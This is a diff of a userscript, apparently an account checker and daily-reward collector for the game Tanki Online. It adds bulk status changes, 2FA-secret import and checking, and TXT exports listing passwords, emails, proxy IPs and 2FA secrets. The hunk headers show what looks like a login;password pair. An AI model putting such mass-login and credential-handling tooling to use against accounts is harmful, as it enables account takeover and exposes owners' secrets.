+            if (ds === "Не собрано") cntNotCollected++;
+            else if (ds === "Собрано") cntCollected++;
+            else if (ds === "Подписка завершена") cntFinished++;
+            else cntOther++;
+        }
+        const ready = cntNotCollected;
+        const collectedToday = cntCollected + allStored.filter(a => {
+            if (a._source !== "archive") return false;
             const st = getAccountStatus(a.login) || a.status || {};
-            return st.rubiesStatus === "Собрано" || isRubiesCollectedToday(st);
+            return getRubiesDisplayStatus(st) === "Собрано" || isRubiesCollectedToday(st);
         }).length;
-        const finished = allStored.filter(a => {
-            const st = getAccountStatus(a.login) || a.status || {};
-            return a._source === "archive" || !!st.rubiesSubscriptionFinished;
-        }).length;
+        const finished = cntFinished + allStored.filter(a => a._source === "archive").length;
+
+        const statusCounts = {};
+        for (const a of RUBIES_ACCOUNTS) {
+            const st = getAccountStatus(a.login) || {};
+            const ds = getRubiesDisplayStatus(st);
+            statusCounts[ds] = (statusCounts[ds] || 0) + 1;
+        }
 
         el.innerHTML = `
             <div class="tc-section-title">Statistics</div>
             <div class="tc-stats">
                 <div class="tc-stat">
                     <div class="tc-stat-value">${allEligible.length}</div>
-                    <div class="tc-stat-label">Eligible accounts</div>
-                    <div class="tc-stat-sub">Active in list</div>
+                    <div class="tc-stat-label">В очереди</div>
+                    <div class="tc-stat-sub">Eligible к сбору</div>
                 </div>
                 <div class="tc-stat">
-                    <div class="tc-stat-value">${ready}</div>
-                    <div class="tc-stat-label">Ready</div>
-                    <div class="tc-stat-sub">Active subscription</div>
+                    <div class="tc-stat-value">${cntNotCollected}</div>
+                    <div class="tc-stat-label">Не собрано</div>
+                    <div class="tc-stat-sub">В активном списке</div>
                 </div>
                 <div class="tc-stat">
-                    <div class="tc-stat-value">${collectedToday}</div>
-                    <div class="tc-stat-label">Collected</div>
-                    <div class="tc-stat-sub">All stored records</div>
+                    <div class="tc-stat-value">${cntCollected}</div>
+                    <div class="tc-stat-label">Собрано</div>
+                    <div class="tc-stat-sub">В активном списке</div>
                 </div>
                 <div class="tc-stat">
-                    <div class="tc-stat-value">${finished}</div>
-                    <div class="tc-stat-label">Subscriptions ended</div>
-                    <div class="tc-stat-sub">Archive included</div>
+                    <div class="tc-stat-value">${RUBIES_ACCOUNTS.length}</div>
+                    <div class="tc-stat-label">Всего в списке</div>
+                    <div class="tc-stat-sub">Архив отдельно: ${allStored.filter(a => a._source === "archive").length}</div>
                 </div>
             </div>
 
-            <div class="tc-section-title" style="margin-top:22px">Control panel</div>
+            <div class="tc-section-title" style="margin-top:22px">Массовая смена статуса</div>
+            <div class="rub-bulk-box">
+                <div class="rub-bulk-hint">Выбери исходный статус и новый. Изменятся все аккаунты Daily Rubies с исходным статусом. Список ниже обновится сразу.</div>
+                <div class="rub-bulk-row">
+                    <div class="rub-bulk-field">
+                        <div class="rub-bulk-label">С статуса</div>
+                        <select id="rub-bulk-from" class="rub-bulk-select">
+                            <option value="*">Все аккаунты (${RUBIES_ACCOUNTS.length})</option>
+                            ${RUBIES_STATUS_OPTIONS.map(s => `<option value="${escapeHtml(s)}">${escapeHtml(s)} — ${statusCounts[s] || 0}</option>`).join("")}
+                            ${Object.keys(statusCounts).filter(s => !RUBIES_STATUS_OPTIONS.includes(s)).map(s => `<option value="${escapeHtml(s)}">${escapeHtml(s)} — ${statusCounts[s]}</option>`).join("")}
+                        </select>
+                    </div>
+                    <div class="rub-bulk-arrow">→</div>
+                    <div class="rub-bulk-field">
+                        <div class="rub-bulk-label">На статус</div>
+                        <select id="rub-bulk-to" class="rub-bulk-select">
+                            ${RUBIES_STATUS_OPTIONS.map(s => `<option value="${escapeHtml(s)}" ${s === "Не собрано" ? "selected" : ""}>${escapeHtml(s)}</option>`).join("")}
+                        </select>
+                    </div>
+                    <button class="tc-btn tc-btn-primary rub-bulk-btn" id="rub-bulk-apply">Применить</button>
+                </div>
+                <div class="rub-bulk-preview" id="rub-bulk-preview">Выбери статусы выше</div>
+            </div>
+
+            <div class="tc-section-title">Control panel</div>
             <div class="tc-mode-row">
                 <button class="tc-mode-btn ${CONFIG.RUBIES_MODE === "manual" ? "active" : ""}" id="rub-manual">Manual</button>
                 <button class="tc-mode-btn ${CONFIG.RUBIES_MODE === "auto" ? "active" : ""}" id="rub-auto">Automatic</button>
@@ -7957,7 +9380,15 @@ ivan13000;d1f2y3z4
             </div>
             <div class="tc-actions">
                 <button class="tc-btn tc-btn-primary" id="rub-export-all">${ICONS.download} Export all Rubies accounts TXT</button>
+                <button class="tc-btn tc-btn-secondary" id="rub-export-no-bonus">${ICONS.download} Выгрузить БЕЗ компенсации</button>
+                <button class="tc-btn tc-btn-danger" id="rub-remove-no-bonus">⌫ Удалить без компенсации</button>
+                <button class="tc-btn tc-btn-primary" id="rub-restore-from-status">♻ Восстановить из статусов</button>
                 <span style="font-size:11px;color:var(--tc-text-dim);align-self:center">Archive: ${RUBIES_ARCHIVE.length}</span>
+            </div>
+            <div style="font-size:11px;color:var(--tc-text-dim);margin:-6px 0 12px;line-height:1.45">
+                «Удалить без компенсации» убирает только аккаунты без компенсации И без признаков подписки (прогресс/дни/сбор).
+                Если список опустел по ошибке — жми «Восстановить из статусов» (статусы подписки в storage не удалялись).
+                Также можно снова импортировать TXT-бэкап, если он скачался при удалении.
             </div>
 
             <div class="tc-section-title" style="margin-top:24px">Все аккаунты Daily Rubies</div>
@@ -7984,6 +9415,55 @@ ivan13000;d1f2y3z4
 
         document.getElementById("rub-manual").addEventListener("click", () => { CONFIG.RUBIES_MODE = "manual"; saveConfig(); renderRubies(); });
         document.getElementById("rub-auto").addEventListener("click", () => { CONFIG.RUBIES_MODE = "auto"; saveConfig(); renderRubies(); scheduleRubies(); });
+
+        const updateBulkPreview = () => {
+            const fromEl = document.getElementById("rub-bulk-from");
+            const toEl = document.getElementById("rub-bulk-to");
+            const prev = document.getElementById("rub-bulk-preview");
+            if (!prev) return;
+            const fromStatus = fromEl?.value || "*";
+            const toStatus = toEl?.value || "";
+            let matchCount = 0;
+            for (const acc of RUBIES_ACCOUNTS) {
+                const st = getAccountStatus(acc.login) || {};
+                const cur = getRubiesDisplayStatus(st);
+                if (fromStatus === "*" || cur === fromStatus) matchCount++;
+            }
+            const fromLabel = fromStatus === "*" ? "всех аккаунтов" : `«${fromStatus}»`;
+            prev.textContent = matchCount
+                ? `Будет изменено: ${matchCount} акк. (${fromLabel} → «${toStatus}»)`
+                : `Нет аккаунтов со статусом ${fromLabel}`;
+        };
+        document.getElementById("rub-bulk-from")?.addEventListener("change", updateBulkPreview);
+        document.getElementById("rub-bulk-to")?.addEventListener("change", updateBulkPreview);
+        updateBulkPreview();
+
+        document.getElementById("rub-bulk-apply")?.addEventListener("click", () => {
+            const fromEl = document.getElementById("rub-bulk-from");
+            const toEl = document.getElementById("rub-bulk-to");
+            const fromStatus = fromEl?.value || "*";
+            const toStatus = toEl?.value || "";
+            if (!toStatus) return showToast("Выбери целевой статус", "warning");
+            if (fromStatus === toStatus) return showToast("Исходный и целевой статус одинаковые", "info");
+
+            let matchCount = 0;
+            for (const acc of RUBIES_ACCOUNTS) {
+                const st = getAccountStatus(acc.login) || {};
+                const cur = getRubiesDisplayStatus(st);
+                if (fromStatus === "*" || cur === fromStatus) matchCount++;
+            }
+            if (!matchCount) return showToast("Нет аккаунтов с таким статусом", "warning");
+
+            const fromLabel = fromStatus === "*" ? "всех" : `«${fromStatus}»`;
+            if (!confirm(`Сменить статус ${fromLabel} → «${toStatus}»?\n\nЗатронет: ${matchCount} акк.`)) return;
+
+            const res = bulkChangeRubiesStatus(fromStatus, toStatus);
+            showToast(`Статус изменён: ${res.changed} акк. → «${toStatus}»`, res.changed ? "success" : "warning");
+            console.log("[Daily Rubies] bulk result", res);
+            try { renderAllRubiesAccountsPanel(); } catch (_) {}
+            renderRubies();
+            updateUI();
+        });
         document.getElementById("rub-autostart").addEventListener("change", e => { CONFIG.RUBIES_AUTO_ENABLED = e.target.checked; saveConfig(); scheduleRubies(); });
         document.getElementById("rub-autoreload").addEventListener("change", e => { CONFIG.RUBIES_AUTO_START_ON_RELOAD = e.target.checked; saveConfig(); });
         document.getElementById("rub-time").addEventListener("change", e => { CONFIG.RUBIES_AUTO_TIME = e.target.value || "05:00"; saveConfig(); });
@@ -7995,6 +9475,7 @@ ivan13000;d1f2y3z4
             MODE = "rubies"; saveConfig();
             const count = beginRubiesRun();
             if (!count) return showToast("Нет аккаунтов Daily Rubies", "warning");
+            showToast(`Daily Rubies: ${count} акк.`, "success");
             setRunningState(true);
             isPaused = false;
             updateUI();
@@ -8003,6 +9484,25 @@ ivan13000;d1f2y3z4
         document.getElementById("rub-stop").addEventListener("click", () => { setRunningState(false); isPaused = false; updateUI(); });
 
         document.getElementById("rub-export-all").addEventListener("click", exportAllRubiesTxt);
+        document.getElementById("rub-export-no-bonus")?.addEventListener("click", exportRubiesWithoutBonusTxt);
+        document.getElementById("rub-remove-no-bonus")?.addEventListener("click", () => {
+            const n = RUBIES_ACCOUNTS.filter(acc => {
+                const st = getAccountStatus(acc.login) || {};
+                return !shouldKeepInDailyRubies(acc, st);
+            }).length;
+            if (!n) return showToast("Нет «пустых» аккаунтов (без компенсации и без подписки)", "info");
+            if (!confirm(`Удалить из Daily Rubies ${n} аккаунтов без компенсации и без признаков подписки?\n\nАккаунты с подпиской/прогрессом рубинов НЕ удаляются.\nПеред удалением скачается TXT-бэкап.`)) return;
+            removeRubiesWithoutBonus();
+            renderRubies();
+            updateUI();
+        });
+        document.getElementById("rub-restore-from-status")?.addEventListener("click", () => {
+            const n = restoreRubiesFromKnownStatuses();
+            renderRubies();
+            updateUI();
+            if (n > 0) showToast(`Восстановлено в Daily Rubies: ${n}`, "success");
+            else showToast("Нечего восстанавливать (нет статусов с подпиской)", "info");
+        });
         document.getElementById("rub-add").addEventListener("click", () => {
             const modal = document.getElementById("tc-rubies-add-modal");
             if (!modal) return;
@@ -8233,11 +9733,15 @@ ivan13000;d1f2y3z4
             <div class="twofa-import-box">
                 <textarea id="twofa-import-ta" spellcheck="false" placeholder="login:password:SECRET&#10;login;password;SECRET&#10;&#10;или&#10;Логин - name&#10;Пароль - pass&#10;2FA - SECRET"></textarea>
                 <div class="twofa-import-help">
-                    Форматы: <code>login:password:SECRET</code> · <code>login;password;SECRET</code> · блок с полями Логин/Пароль/2FA(Secret).<br>
-                    После импорта Daily Rubies сможет сам вводить код при входе.
+                    Импорт <b>всех</b> аккаунтов с 2FA secret (без фильтра компенсации).<br>
+                    Форматы: <code>login:password:SECRET</code> · блоки Логин/Пароль/2FA · полный TXT с полем «2FA secret».<br>
+                    Секреты проверяются (генерация TOTP). Дубли по логину мержатся, одинаковый secret у разных логинов — в архив.<br>
+                    После импорта скрипт сможет сам вводить код при входе (Daily Rubies / Checker).
                 </div>
                 <div class="tc-actions" style="margin-top:10px">
                     <button class="tc-btn tc-btn-primary" id="twofa-import-btn">+ Импортировать</button>
+                    <button class="tc-btn tc-btn-secondary" id="twofa-verify-all">✓ Проверить секреты</button>
+                    <button class="tc-btn tc-btn-secondary" id="twofa-dedupe">🗜 Убрать дубли</button>
                     <button class="tc-btn tc-btn-primary" id="twofa-export">${ICONS.download} Экспорт TXT</button>
                     <button class="tc-btn tc-btn-danger" id="twofa-clear">🗑 Очистить</button>
                 </div>
@@ -8249,28 +9753,57 @@ ivan13000;d1f2y3z4
             <div id="twofa-list" class="twofa-list"></div>
         `;
 
-        document.getElementById("twofa-import-btn").addEventListener("click", () => {
+        document.getElementById("twofa-import-btn").addEventListener("click", async () => {
             const ta = document.getElementById("twofa-import-ta");
             const raw = (ta?.value || "").trim();
             if (!raw) return showToast("Вставь аккаунты", "warning");
-            const res = import2FAAccountsFromText(raw);
+            showToast("Импорт 2FA + проверка секретов…", "info");
+            const res = await import2FAAccountsFromText(raw);
             const out = document.getElementById("twofa-import-result");
+            const parts = [];
+            if (res.added) parts.push(`<span style="color:var(--tc-success)">+${res.added}</span>`);
+            if (res.updated) parts.push(`обновлено: ${res.updated}`);
+            if (res.verified) parts.push(`проверено OK: ${res.verified}`);
+            if (res.verifyFail) parts.push(`<span style="color:var(--tc-danger)">TOTP fail: ${res.verifyFail}</span>`);
+            if (res.invalidSecret) parts.push(`битый secret: ${res.invalidSecret}`);
+            if (res.archivedDupSecret) parts.push(`архив дублей secret: ${res.archivedDupSecret}`);
+            if (res.skipped) parts.push(`пропуск: ${res.skipped}`);
+            parts.push(`всего: ${res.total}`);
             if (out) {
-                out.innerHTML = res.added
-                    ? `<span style="color:var(--tc-success)">✓ Добавлено/обновлено: ${res.added}</span>` +
-                      (res.skipped ? ` · без секрета: ${res.skipped}` : "") +
-                      ` · всего: ${load2FAAccounts().length}`
-                    : `<span style="color:var(--tc-danger)">Ничего не добавлено</span>`;
+                out.innerHTML = (res.added || res.updated)
+                    ? parts.join(" · ")
+                    : `<span style="color:var(--tc-danger)">Ничего не добавлено</span>` + (parts.length ? " · " + parts.join(" · ") : "");
             }
-            if (res.added) {
+            if (res.added || res.updated) {
                 if (ta) ta.value = "";
-                showToast(`2FA импорт: +${res.added}`, "success");
+                showToast(`2FA: +${res.added || 0} / upd ${res.updated || 0} / OK ${res.verified || 0}`, "success");
                 render2FA();
             } else {
-                showToast("Не удалось распознать", "warning");
+                showToast("Не удалось распознать аккаунты с 2FA secret", "warning");
             }
         });
 
+        document.getElementById("twofa-verify-all")?.addEventListener("click", async () => {
+            const list = load2FAAccounts();
+            if (!list.length) return showToast("Список 2FA пуст", "info");
+            showToast("Проверка секретов…", "info");
+            let ok = 0, fail = 0;
+            for (const r of list) {
+                const v = await verify2FASecretWorks(r.secret);
+                r.secretVerified = !!v.ok;
+                r.secretVerifiedAt = new Date().toISOString();
+                r.lastCodeCheck = r.secretVerifiedAt;
+                if (v.ok) ok++; else fail++;
+            }
+            save2FAAccounts(list);
+            showToast(`Проверено: OK ${ok}, fail ${fail}`, ok ? "success" : "warning");
+            render2FA();
+        });
+        document.getElementById("twofa-dedupe")?.addEventListener("click", () => {
+            const d = dedupe2FAAccounts();
+            showToast(`Дубли: merge login ${d.mergedLogin}, архив secret ${d.archivedDupSecret}, осталось ${d.total}`, "success");
+            render2FA();
+        });
         document.getElementById("twofa-export").addEventListener("click", () => {
             const data = load2FAAccounts();
             if (!data.length) return showToast("Нет записей 2FA", "warning");
@@ -8332,8 +9865,9 @@ ivan13000;d1f2y3z4
             }
             listEl.innerHTML = filtered.map(r => {
                 const displayName = r.nickname || r.login || "—";
+                const ver = r.secretVerified ? '<span class="tag" style="margin-left:6px;font-size:10px;color:#50e38b">✓ secret OK</span>' : (r.secret ? '<span class="tag" style="margin-left:6px;font-size:10px;color:#f0b429">? unchecked</span>' : '');
                 return `<div class="twofa-card" data-twofa-row data-secret="${escapeHtml(r.secret || "")}">
-                    <div class="twofa-card-name" title="${escapeHtml(r.login || "")}">${escapeHtml(displayName)}</div>
+                    <div class="twofa-card-name" title="${escapeHtml(r.login || "")}">${escapeHtml(displayName)}${ver}</div>
                     <div class="twofa-otp-box">
                         <div class="twofa-otp-label">Код безопасности</div>
                         <div class="twofa-otp-code" data-twofa-code title="Клик — скопировать">······</div>
@@ -8635,7 +10169,10 @@ ivan13000;d1f2y3z4
             }
             ACCOUNTS.push(...newAccounts);
             saveAccounts();
-            for (const acc of newAccounts) GM_deleteValue(CONFIG.DB_PREFIX + acc.login);
+            for (const acc of newAccounts) {
+                try { GM_deleteValue(CONFIG.DB_PREFIX + acc.login); } catch (_) {}
+                try { track2FAFromAccount(acc); } catch (_) {}
+            }
             shuffledAccounts = []; currentIndex = 0;
             updateUI(); renderDashboard(); renderAccounts();
             document.getElementById("import-result").innerHTML = `
@@ -8867,7 +10404,6 @@ ivan13000;d1f2y3z4
             CONFIG.AUTO_ENABLE_2FA = document.getElementById("set-auto-2fa").checked;
             saveConfig();
             if (prevProxyEnabled && !CONFIG.PROXY_ENABLED) {
-                // Пытаемся снять прокси через clearProxy расширения (если bridge поддерживает).
                 (async () => {
                     try {
                         if (proxyExtensionBridge && proxyExtensionBridge.connected) {
@@ -9113,8 +10649,12 @@ ivan13000;d1f2y3z4
             lines.push(`Логин - ${acc.login}`);
             if (acc.password) lines.push(`Пароль - ${acc.password}`);
             if (st.username) lines.push(`Ник - ${st.username}`);
-            if (acc.email) lines.push(`Почта - ${acc.email}`);
-            if (st.loginEmail) lines.push(`Вход через - ${st.loginEmail}`);
+            {
+                const em = normalizeEmail(acc.email) || normalizeEmail(st.loginEmail) || normalizeEmail(st.email) || null;
+                lines.push(`Почта - ${em || "—"}`);
+                if (st.loginEmail) lines.push(`Вход через - ${st.loginEmail}`);
+                else if (em) lines.push(`Вход через - ${em}`);
+            }
             if (acc.year) lines.push(`Год - ${acc.year}`);
             if (st.rank || acc.rankFromBase) lines.push(`Ранг - ${st.rank || acc.rankFromBase}`);
             if (st.rubies) lines.push(`Рубины - ${formatAmount(st.rubies)}`);
@@ -9125,10 +10665,13 @@ ivan13000;d1f2y3z4
             }
             if (st.experience != null) lines.push(`Опыт - ${st.experience}`);
             if (acc.bound !== null && acc.bound !== undefined) lines.push(`Привязан - ${acc.bound ? "да" : "нет"}`);
-            if (st.bonusReceived) lines.push(`Компенсация - да`);
+            lines.push(`Компенсация - ${st.bonusReceived ? "да" : "нет"}`);
             if (st.newNickname) lines.push(`Новый ник - ${st.newNickname}`);
             if (st.nickChange) lines.push(`Смена ника - ${st.nickChange}`);
             if (st.proxyIp) lines.push(`IP - ${st.proxyIp}`);
+            const twofa = get2FAByLogin(acc.login);
+            const secret = (twofa && twofa.secret) || st.twofaSecret || null;
+            if (secret) lines.push(`2FA secret - ${secret}`);
             if (st.reason) lines.push(`Причина - ${st.reason}`);
             if (type === "unchecked") lines.push("Статус - не завершена проверка");
             return lines.join("\n");
@@ -9477,6 +11020,13 @@ ivan13000;d1f2y3z4
         try { updateUI(); } catch (err) { console.error("[init] updateUI:", err); }
         startTankBuilderGuard();
         startEmptyLoginWatcher();
+        try {
+            ensureLocalStorageSpace();
+            startLocalStorageQuotaWatcher();
+            console.log("[Storage Guard] localStorage quota watcher active");
+        } catch (err) {
+            console.warn("[Storage Guard] init failed:", err);
+        }
 
         const dailyResetStarted = maybeResetRubiesOnLoad();
         if (CONFIG.RUBIES_AUTO_ENABLED) scheduleRubies();
@@ -9496,7 +11046,7 @@ ivan13000;d1f2y3z4
             isRunning = true;
             setTimeout(() => { startChecking(); updateUI(); }, 1800);
         }
-        console.log("◆ Tanki Checker + Rubies v1.0.1 started | Mode:", MODE);
+        console.log("◆ Tanki Checker + Rubies v1.0.3 started | Mode:", MODE);
     }
 
     if (document.readyState === "complete") init();
